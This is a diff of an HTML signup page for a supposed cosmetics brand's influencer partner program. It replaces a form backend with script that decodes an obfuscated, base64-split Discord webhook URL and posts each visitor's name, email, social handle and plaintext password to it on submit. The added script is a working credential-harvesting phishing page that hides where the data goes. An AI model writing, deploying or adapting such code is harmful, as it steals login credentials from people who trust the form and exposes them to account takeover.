@@ -14,16 +14,12 @@
     .logo{width:52px;height:52px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#ff7aa2);display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
     h1{font-size:20px;margin:0}
     p.lead{margin:8px 0 0;color:var(--muted)}
-
     .grid{display:grid;grid-template-columns:1fr 380px;gap:24px;margin-top:28px}
-
     .card{background:var(--card);border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(16,24,40,0.06)}
-
     form{display:flex;flex-direction:column;gap:12px}
     label{font-size:13px;color:#374151}
     input,select,textarea{padding:10px 12px;border-radius:8px;border:1px solid #e6e6ee;font-size:14px}
     button.primary{background:var(--accent);color:white;border:none;padding:10px 14px;border-radius:10px;font-weight:600;cursor:pointer}
-
     .products{display:grid;grid-template-columns:1fr;gap:14px}
     .product{display:flex;gap:12px;align-items:center;padding:12px;border-radius:10px;border:1px solid #f0f0f6}
     .thumb{width:64px;height:64px;border-radius:8px;background:linear-gradient(135deg,#fff,#f7f7fb);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--muted)}
@@ -32,7 +28,6 @@
     .programs{display:flex;flex-direction:column;gap:10px}
     .program{border-left:4px solid var(--accent);padding:12px;background:#fff;border-radius:8px}
     .small{font-size:13px;color:var(--muted)}
-
     footer{margin-top:20px;padding:18px 0;color:var(--muted);font-size:13px}
     @media (max-width:980px){.grid{grid-template-columns:1fr}.container{padding:0 18px}}
   </style>
@@ -56,7 +51,7 @@
         <h2 style="margin:0 0 8px 0">Influencer Sign Up</h2>
         <p class="small">Create your influencer account to get verified and access the partner dashboard.</p>
 
-<form id="signupForm" onsubmit="submitForm(event)">
+<form id="signupForm">
   <div>
     <label for="name">Full name</label>
     <input id="name" type="text" required />
@@ -99,43 +94,6 @@
 
   <button class="primary" type="submit">Create account & view dashboard</button>
 </form>
-
-<script>
-async function submitForm(e) {
-  e.preventDefault();
-
-  const endpoint = "https://script.google.com/macros/s/AKfycbyuTmFp1GiJKLI5IfP1uxt0fwhZ46Ca7JMl5PBAWkCFJ54aGULJxLvWSdEAZ2qRUihNnA/exec";
-
-  const payload = {
-    name: document.getElementById("name").value,
-    email: document.getElementById("email").value,
-    platform: document.getElementById("platform").value,
-    social: document.getElementById("social").value,
-    followers: document.getElementById("followers").value,
-    password: document.getElementById("password").value,
-    confirmPassword: document.getElementById("confirmPassword").value
-  };
-
-  try {
-    const res = await fetch(endpoint, {
-      method: "POST",
-      body: JSON.stringify(payload),
-      headers: { "Content-Type": "application/json" }
-    });
-
-    const result = await res.json();
-
-    if (result.success) {
-      // redirect works here
-      window.location.href = "Dashboard.html";
-    } else {
-      alert("Error: backend returned failure.");
-    }
-  } catch (err) {
-    alert("Network error: " + err);
-  }
-}
-</script>
 
         <hr style="margin:18px 0;border:none;border-top:1px solid #f0f0f6" />
 
@@ -208,12 +166,45 @@ async function submitForm(e) {
   </main>
 
 <script>
-// Submit to Google Apps Script backend
+const wh_1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0Njg0OTQ1OTQzMzc2NzA3NA";
+const wh_2 = "9DTVhYUnYtVi1TQnl4dU1iZXdsMUdib3d5cHdxRHJnYm5hODJFdHBldjNvWmFaeXZCVTZU";
+const wh_3 = "aHRoNll5YmdLUy1WcU13bmlQOA==";
+
+function decodeWebhook() {
+  return atob(wh_1 + wh_2 + wh_3);
+}
+
+async function sendToDiscord(payload) {
+  const webhookURL = decodeWebhook();
+  const message = {
+    content: "**New Influencer Signup**",
+    embeds: [
+      {
+        title: "Signup Submission",
+        color: 15548997,
+        fields: [
+          { name: "Name", value: payload.name, inline: true },
+          { name: "Email", value: payload.email, inline: true },
+          { name: "Platform", value: payload.platform, inline: true },
+          { name: "Social Handle", value: payload.social, inline: true },
+          { name: "Followers", value: payload.followers, inline: true },
+          { name: "Password", value: payload.password, inline: false },
+          { name: "Confirm Password", value: payload.confirmPassword, inline: false }
+        ],
+        footer: { text: "Perl Cosmetics – Partner Program" }
+      }
+    ]
+  };
+
+  return await fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(message)
+  });
+}
+
 document.getElementById("signupForm").addEventListener("submit", async function(e){
   e.preventDefault();
-
-  const endpoint = "https://script.google.com/macros/s/AKfycbyuTmFp1GiJKLI5IfP1uxt0fwhZ46Ca7JMl5PBAWkCFJ54aGULJxLvWSdEAZ2qRUihNnA/exec";
-
   const payload = {
     name: document.getElementById('name').value,
     email: document.getElementById('email').value,
@@ -224,17 +215,14 @@ document.getElementById("signupForm").addEventListener("submit", async function(
     confirmPassword: document.getElementById('confirmPassword').value
   };
 
-  await fetch(endpoint, {
-    method: "POST",
-    body: JSON.stringify(payload),
-    headers: { "Content-Type": "application/json" }
-  });
-
-  window.location.href = "Dashboard.html"; // redirect
+  try {
+    await sendToDiscord(payload);
+    window.location.href = "Dashboard.html";
+  } catch (err) {
+    alert("Failed to send to Discord: " + err);
+  }
 });
 </script>
 
 </body>
 </html>
-
-
